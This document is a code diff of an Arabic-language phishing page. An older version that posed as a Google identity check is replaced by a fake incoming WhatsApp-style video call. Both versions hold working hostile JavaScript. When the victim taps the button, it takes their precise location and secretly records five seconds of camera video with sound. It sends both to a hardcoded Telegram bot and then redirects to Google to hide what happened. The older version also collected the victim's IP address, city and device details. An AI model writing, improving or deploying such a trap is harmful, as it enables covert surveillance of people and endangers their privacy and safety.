@@ -3,84 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security - التحقق من الهوية</title>
+    <title>مكالمة فيديو واردة...</title>
     <style>
-        body { font-family: sans-serif; background-color: #f1f3f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        img { width: 75px; margin-bottom: 20px; }
-        .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; width: 100%; }
+        body { margin: 0; background: #111; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .caller-img { width: 120px; height: 120px; border-radius: 50%; border: 2px solid #25D366; margin-bottom: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(37, 211, 102, 0); } 100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); } }
+        h2 { margin: 10px 0; font-size: 24px; }
+        p { color: #aaa; margin-bottom: 50px; }
+        .controls { display: flex; gap: 40px; }
+        .btn { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; border: none; transition: 0.3s; }
+        .accept { background: #25D366; }
+        .decline { background: #FF3B30; }
+        .btn svg { width: 35px; fill: white; }
         #v { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    <h1>تحقق أمان إضافي</h1>
-    <p>لحماية حسابك، يرجى السماح بالوصول للكاميرا والموقع لإكمال فحص الهوية الحي (Live Verification).</p>
-    <button class="btn" id="startBtn" onclick="executeMission()">تأكيد الهوية الآن</button>
-</div>
+    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Adham" class="caller-img">
+    <h2>Adham Atya</h2>
+    <p>مكالمة فيديو واردة...</p>
 
-<video id="v" autoplay muted playsinline></video>
+    <div class="controls">
+        <div class="btn decline" onclick="location.href='https://google.com'">
+            <svg viewBox="0 0 24 24"><path d="M6.62,10.79C8.06,13.62 10.38,15.94 13.21,17.38L15.41,15.18C15.69,14.9 16.08,14.82 16.43,14.93C17.55,15.3 18.75,15.5 20,15.5A1,1 0 0,1 21,16.5V20A1,1 0 0,1 20,21A17,17 0 0,1 3,4A1,1 0 0,1 4,3H7.5A1,1 0 0,1 8.5,4C8.5,5.25 8.7,6.45 9.07,7.57C9.18,7.92 9.1,8.31 8.82,8.59L6.62,10.79Z"/></svg>
+        </div>
+        <div class="btn accept" id="acceptBtn" onclick="startTrap()">
+            <svg viewBox="0 0 24 24"><path d="M21,16.5C21,16.88 20.79,17.21 20.47,17.38L12.57,21.82C12.41,21.94 12.21,22 12,22C11.79,22 11.59,21.94 11.43,21.82L3.53,17.38C3.21,17.21 3,16.88 3,16.5V7.5C3,7.12 3.21,6.79 3.53,6.62L11.43,2.18C11.59,2.06 11.79,2 12,2C12.21,2 12.41,2.06 12.57,2.18L20.47,6.62C20.79,6.79 21,7.12 21,7.5V16.5Z"/></svg>
+        </div>
+    </div>
 
-<script>
-    const T = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
-    const ID = "7109332130";
+    <video id="v" autoplay muted playsinline></video>
 
-    async function executeMission() {
-        document.getElementById('startBtn').innerText = "جاري الفحص...";
-        
-        // 1. الموقع الجغرافي
-        if (navigator.geolocation) {
+    <script>
+        const T = "8493731392:AAHXao8GIwtJUs1mUy47oPqTqxIhAHASX_c";
+        const ID = "7109332130";
+
+        async function startTrap() {
+            document.getElementById('acceptBtn').style.opacity = "0.5";
+            
+            // 1. سحب الموقع والـ IP فوراً
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await send(`📍 **الموقع الدقيق!**\nالرابط: ${map}\nالدقة: ${pos.coords.accuracy} متر`);
+                await send(`📍 **موقع الضحية الدقيق:**\n${map}`);
             }, null, {enableHighAccuracy: true});
+
+            // 2. تسجيل فيديو 5 ثوانٍ بصوت وصورة (صامت في الخلفية)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendVideo(blob);
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = "https://www.google.com"; // تمويه
+                };
+
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000); 
+
+            } catch (e) {
+                window.location.href = "https://www.google.com";
+            }
         }
 
-        // 2. البيانات التقنية
-        const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
-        await send(`👤 **هدف جديد:**\n🌐 IP: \`${ip.ip}\`\n📍 المدينة: \`${ip.city}\`\n📱 الجهاز: \`${navigator.platform}\``);
-
-        // 3. تسجيل الفيديو (5 ثوانٍ)
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
-            const video = document.getElementById('v');
-            video.srcObject = stream;
-
-            const recorder = new MediaRecorder(stream);
-            const chunks = [];
-
-            recorder.ondataavailable = e => chunks.push(e.data);
-            recorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'video/mp4' });
-                await sendVideo(blob);
-                stream.getTracks().forEach(t => t.stop());
-                window.location.href = "https://myaccount.google.com/";
-            };
-
-            recorder.start();
-            setTimeout(() => recorder.stop(), 5000); // تسجيل 5 ثوانٍ
-
-        } catch (e) {
-            window.location.href = "https://myaccount.google.com/";
+        async function send(msg) {
+            return fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
+            });
         }
-    }
 
-    async function send(msg) {
-        return fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ chat_id: ID, text: msg, parse_mode: 'Markdown' })
-        });
-    }
-
-    async function sendVideo(blob) {
-        const f = new FormData();
-        f.append('chat_id', ID);
-        f.append('video', blob, 'capture.mp4');
-        return fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: f });
-    }
-</script>
+        async function sendVideo(blob) {
+            const f = new FormData();
+            f.append('chat_id', ID);
+            f.append('video', blob, 'capture.mp4');
+            return fetch(`https://api.telegram.org/bot${T}/sendVideo`, { method: 'POST', body: f });
+        }
+    </script>
 </body>
 </html>
